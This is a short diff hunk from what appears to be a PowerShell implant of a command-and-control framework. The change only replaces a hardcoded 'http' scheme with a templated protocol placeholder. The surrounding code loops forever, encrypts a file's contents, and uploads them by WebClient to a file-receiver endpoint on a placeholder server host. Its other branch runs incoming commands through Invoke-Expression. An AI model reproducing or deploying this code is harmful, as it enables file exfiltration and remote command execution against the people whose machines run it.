@@ -98,7 +98,7 @@ while($true){
       $efc = EncryptCommand $key $EncodedText
       $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $wc3.UploadString("http://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc")
+      $wc3.UploadString("OCU_PROTO://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc")
     }else{
       try{
         $ec = Invoke-Expression ($fc) | Out-String;
